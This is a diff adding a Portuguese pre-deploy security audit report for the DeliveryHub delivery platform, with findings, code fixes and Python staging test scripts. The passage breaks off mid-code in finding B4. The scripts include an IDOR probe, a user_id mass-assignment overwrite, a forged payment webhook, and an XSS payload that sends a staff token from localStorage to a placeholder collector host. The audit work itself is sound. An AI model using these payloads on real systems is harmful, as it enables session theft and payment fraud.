@@ -1,0 +1,653 @@
+<title>Auditoria DeliveryHub</title>
+<style>
+:root{
+  --ink:#1B211F; --ink-soft:#4B5651; --paper:#F1F3EF; --surface:#FFFFFF;
+  --surface-2:#E9ECE7; --line:#D7DCD4; --accent:#1F6F66; --accent-soft:#E2EFEC;
+  --crit:#B23A2E; --crit-soft:#F6DFDB; --alta:#A85F16; --alta-soft:#F3E3CE;
+  --media:#8A7511; --media-soft:#EFE8C9; --baixa:#4E6577; --baixa-soft:#DEE6EA;
+  --fixed:#1F7A4A; --fixed-soft:#DCEFE2;
+  --code-bg:#F6F5F0; --code-ink:#2A2F2C; --shadow: 0 1px 2px rgba(20,25,20,.06), 0 6px 20px rgba(20,25,20,.05);
+}
+:root:not([data-theme="light"]){
+  @media (prefers-color-scheme: dark){
+    --ink:#E8ECE8; --ink-soft:#AEB8B0; --paper:#10151A; --surface:#171D22;
+    --surface-2:#1D242A; --line:#2B333A; --accent:#5FD1C2; --accent-soft:#173733;
+    --crit:#FF6E5E; --crit-soft:#3A211E; --alta:#F0A94E; --alta-soft:#3A2E16;
+    --media:#E2CD5C; --media-soft:#332C14; --baixa:#9FC0D6; --baixa-soft:#1C2A33;
+    --fixed:#5FD98A; --fixed-soft:#173325;
+    --code-bg:#12171B; --code-ink:#D7DEDA; --shadow: 0 1px 2px rgba(0,0,0,.4), 0 10px 30px rgba(0,0,0,.35);
+  }
+}
+:root[data-theme="dark"]{
+  --ink:#E8ECE8; --ink-soft:#AEB8B0; --paper:#10151A; --surface:#171D22;
+  --surface-2:#1D242A; --line:#2B333A; --accent:#5FD1C2; --accent-soft:#173733;
+  --crit:#FF6E5E; --crit-soft:#3A211E; --alta:#F0A94E; --alta-soft:#3A2E16;
+  --media:#E2CD5C; --media-soft:#332C14; --baixa:#9FC0D6; --baixa-soft:#1C2A33;
+  --fixed:#5FD98A; --fixed-soft:#173325;
+  --code-bg:#12171B; --code-ink:#D7DEDA; --shadow: 0 1px 2px rgba(0,0,0,.4), 0 10px 30px rgba(0,0,0,.35);
+}
+
+*{box-sizing:border-box}
+body{
+  margin:0; background:var(--paper); color:var(--ink);
+  font-family:-apple-system,"Segoe UI",system-ui,Roboto,sans-serif;
+  line-height:1.55; font-size:16px;
+}
+.mono{font-family:ui-monospace,"Cascadia Code","SFMono-Regular","Roboto Mono",Consolas,monospace;}
+a{color:var(--accent)}
+h1,h2,h3{text-wrap:balance; font-weight:700; color:var(--ink)}
+
+.wrap{max-width:840px; margin:0 auto; padding:0 20px 96px}
+
+/* ── Masthead ─────────────────────────────────────────── */
+.masthead{padding:56px 0 28px; border-bottom:1px solid var(--line)}
+.eyebrow{
+  font-family:ui-monospace,"Cascadia Code","SFMono-Regular",Consolas,monospace;
+  font-size:12.5px; letter-spacing:.08em; text-transform:uppercase; color:var(--accent);
+  display:flex; align-items:center; gap:8px; margin-bottom:14px;
+}
+.eyebrow::before{content:""; width:7px; height:7px; background:var(--accent); display:inline-block}
+h1{font-size:2.15rem; margin:0 0 10px; letter-spacing:-.01em}
+.meta{
+  display:flex; flex-wrap:wrap; gap:6px 22px; margin-top:18px;
+  font-family:ui-monospace,"Cascadia Code","SFMono-Regular",Consolas,monospace;
+  font-size:13px; color:var(--ink-soft);
+}
+.meta b{color:var(--ink); font-weight:600}
+
+/* ── Stat strip ───────────────────────────────────────── */
+.stats{display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin:28px 0 8px}
+.stat{
+  background:var(--surface); border:1px solid var(--line); padding:14px 16px;
+}
+.stat .n{font-family:ui-monospace,monospace; font-size:1.9rem; font-weight:700; line-height:1}
+.stat .l{font-size:12px; text-transform:uppercase; letter-spacing:.06em; color:var(--ink-soft); margin-top:6px}
+.stat.crit .n{color:var(--crit)} .stat.alta .n{color:var(--alta)}
+.stat.media .n{color:var(--media)} .stat.baixa .n{color:var(--baixa)}
+
+section{margin-top:52px}
+h2{font-size:1.35rem; margin:0 0 6px}
+.section-note{color:var(--ink-soft); font-size:14.5px; margin:0 0 20px; max-width:65ch}
+
+/* ── Risk table ───────────────────────────────────────── */
+.table-scroll{overflow-x:auto; border:1px solid var(--line); background:var(--surface)}
+table{border-collapse:collapse; width:100%; min-width:640px; font-size:14.5px}
+th{
+  text-align:left; font-family:ui-monospace,monospace; font-size:11.5px; text-transform:uppercase;
+  letter-spacing:.06em; color:var(--ink-soft); padding:10px 14px; border-bottom:1px solid var(--line);
+  background:var(--surface-2);
+}
+td{padding:10px 14px; border-bottom:1px solid var(--line); vertical-align:top}
+tr:last-child td{border-bottom:none}
+td.id{font-family:ui-monospace,monospace; color:var(--ink-soft); white-space:nowrap}
+td.loc{font-family:ui-monospace,monospace; font-size:13px; color:var(--ink-soft)}
+table a{text-decoration:none; color:var(--ink); font-weight:600}
+table a:hover{color:var(--accent)}
+
+/* ── Severity pill ────────────────────────────────────── */
+.pill{
+  display:inline-flex; align-items:center; font-family:ui-monospace,monospace;
+  font-size:11.5px; font-weight:700; letter-spacing:.03em; text-transform:uppercase;
+  padding:3px 8px; border:1px solid transparent; white-space:nowrap;
+}
+.pill.crit{background:var(--crit-soft); color:var(--crit); border-color:var(--crit)}
+.pill.alta{background:var(--alta-soft); color:var(--alta); border-color:var(--alta)}
+.pill.media{background:var(--media-soft); color:var(--media); border-color:var(--media)}
+.pill.baixa{background:var(--baixa-soft); color:var(--baixa); border-color:var(--baixa)}
+.pill.fixed{background:var(--fixed-soft); color:var(--fixed); border-color:var(--fixed)}
+
+.status-banner{
+  margin-top:22px; padding:14px 16px; background:var(--fixed-soft); border:1px solid var(--fixed);
+  font-size:14px; color:var(--ink);
+}
+.status-banner b{color:var(--fixed)}
+.status-banner .commits{display:block; margin-top:6px; font-family:ui-monospace,monospace; font-size:12.5px; color:var(--ink-soft)}
+
+/* ── Finding card ─────────────────────────────────────── */
+.finding{
+  background:var(--surface); border:1px solid var(--line); box-shadow:var(--shadow);
+  padding:26px 26px 22px; margin-bottom:22px; scroll-margin-top:20px;
+}
+.f-head{display:flex; flex-wrap:wrap; align-items:center; gap:10px; margin-bottom:6px}
+.f-head h3{font-size:1.08rem; margin:0}
+.f-loc{font-family:ui-monospace,monospace; font-size:12.5px; color:var(--ink-soft); margin:2px 0 16px}
+.f-loc .repo{color:var(--accent)}
+.f-lead{font-size:13px; text-transform:uppercase; letter-spacing:.06em; color:var(--ink-soft); font-weight:700; margin:18px 0 8px}
+.f-lead:first-of-type{margin-top:4px}
+p{margin:0 0 12px; max-width:68ch}
+.impact{
+  background:var(--surface-2); border-left:3px solid var(--accent); padding:10px 14px;
+  font-size:14.5px; margin:0 0 4px; max-width:68ch;
+}
+
+pre{
+  background:var(--code-bg); color:var(--code-ink); border:1px solid var(--line);
+  padding:14px 16px; overflow-x:auto; font-size:13px; line-height:1.6; margin:0 0 4px;
+}
+code{font-family:ui-monospace,"Cascadia Code","SFMono-Regular",Consolas,monospace}
+.tag{font-family:ui-monospace,monospace; font-size:11px; text-transform:uppercase; letter-spacing:.06em; color:var(--ink-soft)}
+
+/* ── Appendix ─────────────────────────────────────────── */
+.appendix-row td:first-child{white-space:nowrap}
+
+footer{margin-top:64px; padding-top:24px; border-top:1px solid var(--line); font-size:13.5px; color:var(--ink-soft)}
+footer p{max-width:68ch}
+
+@media (max-width:600px){
+  .stats{grid-template-columns:repeat(2,1fr)}
+  h1{font-size:1.7rem}
+  .finding{padding:20px 16px}
+}
+</style>
+
+<div class="wrap">
+
+  <div class="masthead">
+    <div class="eyebrow">Protocolo de Pentest / Code Review — 21-SEGURANCA</div>
+    <h1>Auditoria de Segurança — DeliveryHub</h1>
+    <p style="max-width:62ch;color:var(--ink-soft);font-size:15px">
+      Varredura de código conduzida antes do deploy em produção, cobrindo BOLA/IDOR e
+      isolamento multi-tenant, injeção &amp; validação de entrada, gestão de segredos,
+      tratamento de erros/logs e configuração insegura — nos dois repositórios do produto.
+    </p>
+    <div class="meta">
+      <span><b>Data</b> 2026-08-15</span>
+      <span><b>Escopo</b> serer_delivery (NestJS) + deliveryhub_white_label (React)</span>
+      <span><b>18</b> achados</span>
+    </div>
+  </div>
+
+  <div class="status-banner">
+    <b>Atualizado 2026-08-15:</b> os 4 achados Crítica (B1, B2, B3, F1) e mais um Alta (B5) já foram corrigidos e estão em produção.
+    <span class="commits">serer_delivery: 9fe1e06, 2444607 · deliveryhub_white_label/server_delivery: sincronizado nos mesmos commits · deliveryhub_white_label: a988e59</span>
+  </div>
+
+  <div class="stats">
+    <div class="stat crit"><div class="n">4</div><div class="l">Crítica</div></div>
+    <div class="stat alta"><div class="n">5</div><div class="l">Alta</div></div>
+    <div class="stat media"><div class="n">5</div><div class="l">Média</div></div>
+    <div class="stat baixa"><div class="n">4</div><div class="l">Baixa</div></div>
+  </div>
+
+  <section>
+    <h2>Resumo de riscos</h2>
+    <p class="section-note">Ordenado por severidade. Clique num item pra ir direto ao detalhamento, patch e script de teste.</p>
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>#</th><th>Vulnerabilidade</th><th>Severidade</th><th>Arquivo / linha</th></tr></thead>
+        <tbody>
+          <tr><td class="id">B1</td><td><a href="#b1">IDOR em <code>GET /pedidos/:id</code> — vaza pedido de qualquer usuário</a></td><td><span class="pill crit">Crítica</span> <span class="pill fixed">Corrigido</span></td><td class="loc">pedidos.controller.ts:43</td></tr>
+          <tr><td class="id">B2</td><td><a href="#b2">Mass assignment em <code>PATCH /perfil</code> — sobrescreve <code>customers.user_id</code></a></td><td><span class="pill crit">Crítica</span> <span class="pill fixed">Corrigido</span></td><td class="loc">perfil.service.ts:62</td></tr>
+          <tr><td class="id">B3</td><td><a href="#b3">Webhooks PagBank sem verificação — pagamento/plano forjável</a></td><td><span class="pill crit">Crítica</span> <span class="pill fixed">Corrigido</span></td><td class="loc">planos.service.ts:753 · pagamentos.service.ts:253</td></tr>
+          <tr><td class="id">F1</td><td><a href="#f1">XSS via <code>document.write</code> nos fluxos de impressão</a></td><td><span class="pill crit">Crítica</span> <span class="pill fixed">Corrigido</span></td><td class="loc">utils/printComanda.js:30</td></tr>
+          <tr><td class="id">B4</td><td><a href="#b4">IDOR em <code>GET /pagamentos/pedido/:id</code></a></td><td><span class="pill alta">Alta</span></td><td class="loc">pagamentos.controller.ts:37</td></tr>
+          <tr><td class="id">B5</td><td><a href="#b5">Cobrar PIX/cartão em pedido de outro usuário</a></td><td><span class="pill alta">Alta</span> <span class="pill fixed">Corrigido</span></td><td class="loc">pagamentos.service.ts:112</td></tr>
+          <tr><td class="id">B6</td><td><a href="#b6">Injeção de filtro PostgREST no login do motoboy</a></td><td><span class="pill alta">Alta</span></td><td class="loc">motoboy-auth.service.ts:151</td></tr>
+          <tr><td class="id">B7</td><td><a href="#b7">Mass assignment em impressoras — troca de tenant/token</a></td><td><span class="pill alta">Alta</span></td><td class="loc">impressoras.service.ts:56</td></tr>
+          <tr><td class="id">B8</td><td><a href="#b8">CORS aberto (<code>enableCors()</code> sem origem)</a></td><td><span class="pill alta">Alta</span></td><td class="loc">main.ts:18</td></tr>
+          <tr><td class="id">B9</td><td><a href="#apendice">Token PagBank em claro em <code>/restaurante/minha-empresa</code></a></td><td><span class="pill media">Média</span></td><td class="loc">restaurante.service.ts:45</td></tr>
+          <tr><td class="id">B10</td><td><a href="#apendice">Ausência sistêmica de DTOs — corpo <code>any</code>/interface em vez de classe</a></td><td><span class="pill media">Média</span></td><td class="loc">produtos, empresas, pagamentos…</td></tr>
+          <tr><td class="id">B11</td><td><a href="#apendice">Sem rate limit em login (motoboy/garçom)</a></td><td><span class="pill media">Média</span></td><td class="loc">motoboy-auth / garcom-auth</td></tr>
+          <tr><td class="id">F2</td><td><a href="#apendice">Token via query string persistido em <code>localStorage</code></a></td><td><span class="pill media">Média</span></td><td class="loc">MotoboyGuard.jsx:8</td></tr>
+          <tr><td class="id">F3</td><td><a href="#apendice">Script de terceiro sem SRI no fluxo de impressão</a></td><td><span class="pill media">Média</span></td><td class="loc">printComanda.js:50</td></tr>
+          <tr><td class="id">B12</td><td><a href="#apendice">Sem <code>helmet()</code> / cabeçalhos de segurança</a></td><td><span class="pill baixa">Baixa</span></td><td class="loc">main.ts</td></tr>
+          <tr><td class="id">B13</td><td><a href="#apendice">Política de senha fraca (garçom 4, motoboy 6 caracteres)</a></td><td><span class="pill baixa">Baixa</span></td><td class="loc">garcons.service.ts:39</td></tr>
+          <tr><td class="id">F4</td><td><a href="#apendice"><code>.env</code>/<code>.env_exemplo</code> versionados no git</a></td><td><span class="pill baixa">Baixa</span></td><td class="loc">deliveryhub_white_label/.env</td></tr>
+          <tr><td class="id">F5</td><td><a href="#apendice">Código morto consultando Supabase direto do browser</a></td><td><span class="pill baixa">Baixa</span></td><td class="loc">customerService.js:67</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- ══════════════════════════════ CRÍTICA ══════════════════════════════ -->
+  <section>
+    <h2>Crítica</h2>
+    <p class="section-note">Bloqueia deploy até corrigir — quebra de isolamento entre usuários/tenants ou fraude financeira direta.</p>
+
+    <article class="finding" id="b1">
+      <div class="f-head"><span class="pill crit">Crítica</span><span class="pill fixed">Corrigido</span><h3>B1 — IDOR em <code class="mono">GET /pedidos/:id</code></h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/pedidos/pedidos.controller.ts:43-47 · pedidos.service.ts:124-163</div>
+
+      <p>O endpoint tem o comentário <em>"Admin ou dono do pedido"</em>, mas o guard é só <code class="mono">JwtGuard</code> — qualquer usuário autenticado — e <code class="mono">buscar()</code> nunca compara <code class="mono">pedido.user_id</code> com quem está chamando. Basta incrementar o <code class="mono">id</code>.</p>
+      <p class="impact"><b>Impacto:</b> qualquer cliente logado lê nome, e-mail, telefone, endereço e status de pagamento de <b>qualquer outro pedido do sistema</b>. Pior: a resposta também inclui <code class="mono">motoboys.access_token</code> — uma credencial legada do entregador — vazando um token de bearer real via IDOR.</p>
+
+      <div class="f-lead">Correção</div>
+      <pre><code>// pedidos.controller.ts
+@Get(':id')
+@UseGuards(JwtGuard)
+buscar(@Param('id', ParseIntPipe) id: number, @Req() req: any) {
+  return this.service.buscar(id, req.userId, req.userRole);
+}
+
+// pedidos.service.ts
+async buscar(id: number, callerUserId: string, callerRole: string) {
+  const { data: pedido, error } = await this.supabase.client
+    .from('orders')
+    .select('id, total, ..., user_id, motoboy_id, ...')
+    .eq('id', id)
+    .maybeSingle();
+
+  if (error) throw error;
+  if (!pedido) throw new NotFoundException(`Pedido ${id} não encontrado`);
+
+  // dono do pedido ou admin — nunca confiar só no JwtGuard genérico
+  if (callerRole !== 'admin' && pedido.user_id !== callerUserId) {
+    throw new ForbiddenException('Você não tem acesso a este pedido');
+  }
+
+  const [{ data: itensRaw }, { data: cliente }, { data: empresa }, { data: motoboy }, { data: pagamento }] = await Promise.all([
+    /* ... */
+    pedido.motoboy_id
+      // access_token nunca deveria sair no payload — remove do select
+      ? this.supabase.client.from('motoboys').select('id, name, phone').eq('id', pedido.motoboy_id).maybeSingle()
+      : Promise.resolve({ data: null }),
+    /* ... */
+  ]);
+  /* resto sem mudança */
+}</code></pre>
+
+      <div class="f-lead">Script de teste (Staging)</div>
+      <pre><code>import os, requests
+
+STAGING_URL = os.environ["STAGING_URL"]
+ATTACKER_TOKEN = os.environ["ATTACKER_JWT"]       # cliente comum, não admin
+VICTIM_ORDER_ID = int(os.environ.get("VICTIM_ORDER_ID", "1"))
+
+r = requests.get(
+    f"{STAGING_URL}/pedidos/{VICTIM_ORDER_ID}",
+    headers={"Authorization": f"Bearer {ATTACKER_TOKEN}"},
+    timeout=10,
+)
+
+if r.status_code == 200 and r.json().get("cliente"):
+    print("FALHA CONFIRMADA: pedido de outro usuário acessível.")
+    print(r.json()["cliente"])
+else:
+    print(f"OK — bloqueado (status {r.status_code})")</code></pre>
+    </article>
+
+    <article class="finding" id="b2">
+      <div class="f-head"><span class="pill crit">Crítica</span><span class="pill fixed">Corrigido</span><h3>B2 — Mass assignment em <code class="mono">PATCH /perfil</code></h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/perfil/perfil.controller.ts:16-22 · perfil.service.ts:59-65</div>
+
+      <p>O body é tipado como interface TS (<code class="mono">{'{'} name?, phone_e164?, address_json? {'}'}</code>), não como classe — o <code class="mono">ValidationPipe({'{'}whitelist:true{'}'})</code> global só filtra campos extras quando o parâmetro é uma <em>classe</em> com decorators do <code class="mono">class-validator</code>; interfaces são apagadas em tempo de execução, então nada é removido. O caminho de <code class="mono">update</code> faz <code class="mono">{'{'}...body, updated_at{'}'}</code> sem nunca reafirmar <code class="mono">user_id</code> depois do spread.</p>
+      <p class="impact"><b>Impacto:</b> um cliente autenticado pode enviar <code class="mono">{'{'}"name":"x","user_id":"&lt;uuid-da-vítima&gt;"{'}'}</code> no PATCH e reescrever a coluna <code class="mono">customers.user_id</code> do próprio registro pra apontar pra outra conta — encadeável com o <code class="mono">pedido.user_id</code> vazado em B1 pra confundir identidade entre contas.</p>
+
+      <div class="f-lead">Correção</div>
+      <pre><code>// src/perfil/dto/update-perfil.dto.ts (novo arquivo)
+import { IsOptional, IsString, IsObject, MaxLength } from 'class-validator';
+
+export class UpdatePerfilDto {
+  @IsOptional() @IsString() @MaxLength(120) name?: string;
+  @IsOptional() @IsString() @MaxLength(20) phone_e164?: string;
+  @IsOptional() @IsObject() address_json?: Record&lt;string, any&gt;;
+}
+
+// perfil.controller.ts
+@Patch()
+update(@Req() req: any, @Body() body: UpdatePerfilDto) {
+  return this.service.updateMeuPerfil(req.userId, body);
+}</code></pre>
+      <p style="font-size:13.5px;color:var(--ink-soft)">Sendo uma classe real, o <code class="mono">ValidationPipe</code> global (já configurado com <code class="mono">whitelist:true</code>) passa a descartar qualquer campo fora do DTO automaticamente — nenhuma mudança extra é necessária no service.</p>
+
+      <div class="f-lead">Script de teste (Staging)</div>
+      <pre><code>import os, requests
+
+STAGING_URL = os.environ["STAGING_URL"]
+ATTACKER_TOKEN = os.environ["ATTACKER_JWT"]
+VICTIM_USER_ID = os.environ["VICTIM_USER_ID"]     # uuid de outra conta em staging
+
+r = requests.patch(
+    f"{STAGING_URL}/perfil",
+    headers={"Authorization": f"Bearer {ATTACKER_TOKEN}"},
+    json={"name": "teste-pentest", "user_id": VICTIM_USER_ID},
+    timeout=10,
+)
+perfil = requests.get(f"{STAGING_URL}/perfil",
+                       headers={"Authorization": f"Bearer {ATTACKER_TOKEN}"}).json()
+
+if perfil.get("user_id") == VICTIM_USER_ID:
+    print("FALHA CONFIRMADA: user_id sobrescrito via mass assignment.")
+else:
+    print("OK — campo extra foi descartado pelo ValidationPipe.")</code></pre>
+    </article>
+
+    <article class="finding" id="b3">
+      <div class="f-head"><span class="pill crit">Crítica</span><span class="pill fixed">Corrigido</span><h3>B3 — Webhooks PagBank sem verificação de assinatura</h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/planos/planos-webhook.controller.ts + planos.service.ts:753-783 · src/pagamentos/pagamentos.controller.ts:44-47 + pagamentos.service.ts:253-292</div>
+
+      <p>O comentário no próprio código já admite o problema: <em>"PagBank não envia token de autenticação nos webhooks"</em>. Ambos os handlers pegam <code class="mono">charges[0].status</code> do corpo do POST e confiam nele diretamente pra marcar fatura/pagamento como <code class="mono">'paga'</code>/<code class="mono">'paid'</code> — sem checar assinatura, sem reconsultar o PagBank.</p>
+      <p class="impact"><b>Impacto:</b> qualquer pessoa que descubra/adivinhe um <code class="mono">pagbank_order_id</code> pode forjar um POST pra <code class="mono">/planos/webhook</code> ou <code class="mono">/pagamentos/webhook</code> com <code class="mono">status:"PAID"</code> e conseguir plano ativado ou pedido marcado como pago sem pagar nada — inclusive disparando <code class="mono">elevarDonoSeNecessario()</code>, que eleva o papel do dono da loja.</p>
+
+      <div class="f-lead">Correção</div>
+      <pre><code>// pagamentos.service.ts — reconsulta a ordem real no PagBank em vez de confiar no body
+async processarWebhook(evento: any) {
+  const payload = evento?.data ?? evento;
+  const pagbankOrderId: string = payload?.id ?? payload?.reference_id;
+  if (!pagbankOrderId) return { ignorado: true };
+
+  const { data: pagamento } = await this.supabase.client
+    .from('pagamentos')
+    .select('id, order_id, status')
+    .eq('pagbank_order_id', pagbankOrderId)
+    .maybeSingle();
+  if (!pagamento) return { ignorado: true, motivo: 'pagamento não encontrado' };
+  if (pagamento.status === 'paid') return { ignorado: true, motivo: 'já processado' };
+
+  const { data: pedido } = await this.supabase.client
+    .from('orders').select('restaurant_id').eq('id', pagamento.order_id).maybeSingle();
+  if (!pedido) return { ignorado: true, motivo: 'pedido não encontrado' };
+
+  // autoridade é a API do PagBank, não o corpo do POST recebido
+  const { client } = await this.getPagBankClient(pedido.restaurant_id);
+  const ordemReal = await client.buscarOrdem(pagbankOrderId);
+  const detalhe = ordemReal?.charges?.[0] ?? ordemReal?.payments?.[0];
+  if (!detalhe) return { ignorado: true };
+
+  const statusPagbank: string = detalhe?.status ?? '';
+  const pago = STATUS_PAGOS.includes(statusPagbank);
+  /* resto do método sem mudança, a partir daqui statusPagbank já é confiável */
+}
+
+// planos.service.ts — mesmo padrão
+async processarWebhook(evento: any) {
+  const payload = evento?.data ?? evento;
+  const pagbankOrderId: string = payload?.id ?? payload?.reference_id;
+  if (!pagbankOrderId) return { ignorado: true };
+
+  const { data: fatura } = await this.supabase.client
+    .from('plano_faturas')
+    .select('id, status, restaurant_id, plano_id_troca')
+    .eq('pagbank_order_id', pagbankOrderId)
+    .maybeSingle();
+  if (!fatura) return { ignorado: true, motivo: 'fatura não encontrada' };
+  if (fatura.status === 'paga') return { ignorado: true, motivo: 'já processado' };
+
+  const { client } = await this.clientPlataforma();
+  const ordemReal = await client.buscarOrdem(pagbankOrderId);
+  const detalhe = ordemReal?.charges?.[0] ?? ordemReal?.payments?.[0];
+  if (!detalhe || !STATUS_PAGOS.includes(detalhe?.status ?? '')) return { ignorado: true };
+
+  await this.supabase.client.from('plano_faturas')
+    .update({ status: 'paga', pago_em: new Date().toISOString(), atualizado_em: new Date().toISOString() })
+    .eq('id', fatura.id);
+  await this.aplicarTrocaSeNecessario(fatura);
+  await this.elevarDonoSeNecessario(fatura.restaurant_id);
+  return { processado: true, fatura_id: fatura.id };
+}</code></pre>
+      <p style="font-size:13.5px;color:var(--ink-soft)">Ambos os handlers já reaproveitam <code class="mono">buscarOrdem()</code>, que existe em <code class="mono">pagbank.client.ts:111</code> — não precisa de dependência nova. Se o PagBank passar a assinar webhooks no futuro, validar a assinatura é uma camada a mais, não um substituto pra essa reconsulta.</p>
+
+      <div class="f-lead">Script de teste (Staging)</div>
+      <pre><code>import os, requests
+
+STAGING_URL = os.environ["STAGING_URL"]
+ADMIN_TOKEN = os.environ["ADMIN_JWT"]
+RESTAURANT_ID = os.environ["RESTAURANT_ID_STAGING"]
+FATURA_ID = os.environ["FATURA_ID_PENDENTE"]          # fatura 'pendente' conhecida
+PAGBANK_ORDER_ID = os.environ["PAGBANK_ORDER_ID_DA_FATURA"]
+
+# webhook forjado, sem nunca ter passado pelo fluxo real de cobrança
+forjado = requests.post(f"{STAGING_URL}/planos/webhook", json={
+    "id": PAGBANK_ORDER_ID,
+    "charges": [{"id": "forjado", "status": "PAID"}],
+}, timeout=10)
+print("POST /planos/webhook:", forjado.status_code)
+
+faturas = requests.get(
+    f"{STAGING_URL}/planos/faturas",
+    params={"restaurant_id": RESTAURANT_ID},
+    headers={"Authorization": f"Bearer {ADMIN_TOKEN}"},
+    timeout=10,
+).json()["faturas"]
+
+fatura = next(f for f in faturas if str(f["id"]) == str(FATURA_ID))
+if fatura["status"] == "paga":
+    print("FALHA CONFIRMADA: fatura marcada paga por webhook forjado, sem cobrança real.")
+else:
+    print(f"OK — status permaneceu '{fatura['status']}' (backend reconsultou o PagBank).")</code></pre>
+    </article>
+
+    <article class="finding" id="f1">
+      <div class="f-head"><span class="pill crit">Crítica</span><span class="pill fixed">Corrigido</span><h3>F1 — XSS via <code class="mono">document.write</code> nos fluxos de impressão</h3></div>
+      <div class="f-loc"><span class="repo">deliveryhub_white_label</span> · src/utils/printComanda.js:30-34,199-247 · RelatorioPanel.jsx:91-97 · restaurante-financeiro/index.jsx:95-155</div>
+
+      <p>Nome/telefone/endereço do cliente (inclusive o campo livre <em>"referência"</em> digitado no checkout) e nome de produto são interpolados sem escape direto em strings HTML, que depois vão pra <code class="mono">iframe.contentDocument.write(html)</code> — sem DOMPurify nem qualquer sanitização em todo o projeto (confirmado por busca).</p>
+      <p class="impact"><b>Impacto:</b> um cliente mal-intencionado registra <code class="mono">&lt;img src=x onerror=...&gt;</code> como referência de endereço no próprio checkout. Quando um funcionário abre "Imprimir ficha do motoboy" (ou o relatório financeiro) pra esse pedido, o payload executa <b>na mesma origem do app</b> — de onde consegue ler <code class="mono">localStorage</code>, incluindo os tokens de garçom/cozinha/motoboy e a sessão Supabase (ver F2). Uma referência de endereço vira roubo de sessão de um funcionário.</p>
+
+      <div class="f-lead">Correção</div>
+      <pre><code>// src/utils/escapeHtml.js (novo arquivo)
+export const escapeHtml = (v) =>
+  String(v ?? '').replace(/[&amp;&lt;&gt;"']/g, (c) => ({
+    '&amp;': '&amp;amp;', '&lt;': '&amp;lt;', '&gt;': '&amp;gt;', '"': '&amp;quot;', "'": '&amp;#39;',
+  })[c]);
+
+// src/utils/printComanda.js — exemplo em printFichaMotoboy (aplicar o mesmo
+// wrap em todo campo de cliente/produto/operador nos outros pontos listados
+// acima: linhas 199, 204, 206, RelatorioPanel.jsx:91/97, financeiro:95/137-144)
+import { escapeHtml } from './escapeHtml';
+/* ... */
+&lt;div class="c" style="font-size:12px"&gt;${escapeHtml(restauranteNome ?? '')}&lt;/div&gt;
+/* ... */
+&lt;div class="bold"&gt;${escapeHtml(cliente?.name ?? 'Cliente')}&lt;/div&gt;
+${cliente?.phone_e164 ? `&lt;div&gt;${escapeHtml(cliente.phone_e164)}&lt;/div&gt;` : ''}
+&lt;div class="addr" style="margin-top:4px"&gt;
+  ${rua ? `&lt;div&gt;${escapeHtml(rua)}&lt;/div&gt;` : ''}
+  ${compl ? `&lt;div&gt;${escapeHtml(compl)}&lt;/div&gt;` : ''}
+  ${cidade ? `&lt;div&gt;${escapeHtml(cidade)}&lt;/div&gt;` : ''}
+  ${ref ? `&lt;div style="font-weight:bold"&gt;Ref: ${escapeHtml(ref)}&lt;/div&gt;` : ''}
+&lt;/div&gt;
+/* ... */
+${itens.map((i) => `&lt;div class="item"&gt;&lt;span class="qty"&gt;${i.quantity}x&lt;/span&gt;&lt;span&gt;${escapeHtml(i.product_name ?? `#${i.product_id}`)}&lt;/span&gt;&lt;/div&gt;`).join('')}</code></pre>
+
+      <div class="f-lead">Script de teste (Staging)</div>
+      <pre><code>import os, requests
+
+STAGING_URL = os.environ["STAGING_URL"]
+CUSTOMER_TOKEN = os.environ["CUSTOMER_JWT"]
+RESTAURANT_ID = int(os.environ["RESTAURANT_ID"])
+PRODUCT_ID = int(os.environ["PRODUCT_ID"])
+COLLECTOR_URL = os.environ.get("COLLECTOR_URL", "https://SEU-COLLECTOR.exemplo/x")
+
+XSS_PAYLOAD = (
+    "&lt;img src=x onerror=\"fetch('" + COLLECTOR_URL +
+    "?t='+localStorage.getItem('garcom_access_token'))\"&gt;"
+)
+
+perfil = requests.patch(f"{STAGING_URL}/perfil",
+    headers={"Authorization": f"Bearer {CUSTOMER_TOKEN}"},
+    json={"address_json": {"logradouro": "Rua Teste", "numero": "1", "referencia": XSS_PAYLOAD}},
+    timeout=10)
+print("PATCH /perfil:", perfil.status_code)
+
+pedido = requests.post(f"{STAGING_URL}/pedidos",
+    headers={"Authorization": f"Bearer {CUSTOMER_TOKEN}"},
+    json={"restaurant_id": RESTAURANT_ID, "payment_method": "cash",
+          "itens": [{"product_id": PRODUCT_ID, "quantity": 1}]},
+    timeout=10)
+print("POST /pedidos:", pedido.status_code, pedido.json())
+
+print()
+print('Validação manual: no painel do restaurante, abra este pedido e clique')
+print('em "Imprimir ficha do motoboy". Se um beacon chegar no seu COLLECTOR_URL,')
+print("a falha está confirmada — a execução roda no DOM do navegador e não é")
+print("automatizável só por HTTP; este script garante que o payload chega íntegro.")</code></pre>
+    </article>
+  </section>
+
+  <!-- ══════════════════════════════ ALTA ══════════════════════════════ -->
+  <section>
+    <h2>Alta</h2>
+    <p class="section-note">Exploráveis com esforço moderado; impacto direto em dados financeiros ou de terceiros.</p>
+
+    <article class="finding" id="b4">
+      <div class="f-head"><span class="pill alta">Alta</span><h3>B4 — IDOR em <code class="mono">GET /pagamentos/pedido/:id</code></h3></div>
+      <div class="f-loc"><span class="repo">serer_delivery</span> · src/pagamentos/pagamentos.controller.ts:37-41 · pagamentos.service.ts:242-251</div>
+      <p><code class="mono">buscarPorPedido()</code> filtra só por <code class="mono">order_id</code>, sem checar se o pedido pertence ao chamador.</p>
+      <p class="impact"><b>Impacto:</b> qualquer usuário autenticado lê <code class="mono">pix_code</code>, <code class="mono">pix_qr_url</code> e <code class="mono">pagbank_order_id</code> de pagamentos de terceiros.</p>
+      <div class="f-lead">Correção</div>
+      <pre><code>// pagamentos.controller.ts
+@Get('pedido/:id')
+@UseGuards(JwtGuard)
+buscarPorPedido(@Param('id', ParseIntPipe) id: number, @Req() req: any) {
+  return this.service.buscarPorPedido(id, req.userId, req.userRole);
+}
+
+// pagamentos.service.ts
+async buscarPorPedido(orderId: number, callerUserId: string, callerRole: string) {
+  const pedido = await this.buscarPedido(orderId); // já existe, já lança 404
+  if (callerRole !== 'admin' && pedido.user_id !== callerUserId) {
+    throw new ForbiddenException('Você não tem acesso a este pedido');
+  }
+  const { data, error } = await this.supabase.client
+    .from('pagamentos')
